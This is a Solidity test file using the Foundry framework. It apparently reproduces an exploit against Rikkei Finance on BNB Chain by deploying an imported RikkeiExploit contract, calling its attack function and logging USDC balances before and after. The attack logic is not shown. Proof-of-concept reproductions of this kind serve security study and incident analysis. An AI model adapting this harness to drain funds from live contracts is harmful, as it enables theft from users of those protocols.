//SPDX-License-Identifier: Unlicense
pragma solidity 0.8.13;

import "forge-std/console2.sol";
import "forge-std/Test.sol";
import "forge-std/Vm.sol";
import {RikkeiExploit} from "../RikkeiExploit.sol";
import {IERC20} from "../interfaces/IERC20.sol";


contract RikkeiExploitTest is Test {
    RikkeiExploit exploit;
    IERC20 usdc = IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);
    address bob = 0x00a329c0648769A73afAc7F9381E08FB43dBEA72;

    function setUp() public {

        startHoax(bob);
        exploit = new RikkeiExploit();
    }

    function testExploit() public {
        uint initial_balance = usdc.balanceOf(msg.sender);
        console2.log(msg.sender);
        console2.log(bob);

        console2.log(unicode"ðŸŒŽ initial USDC amount",initial_balance/1e18);

        console2.log(unicode"ðŸ’£ Attacking...");

        exploit.attack{value: 100000000000000}();

        console2.log(unicode"âœ… Exploit Complete!");

        uint post_balance = usdc.balanceOf(msg.sender);

        console2.log(unicode"ðŸŒŽ USDC amount after attacking",post_balance/1e18);

    }


}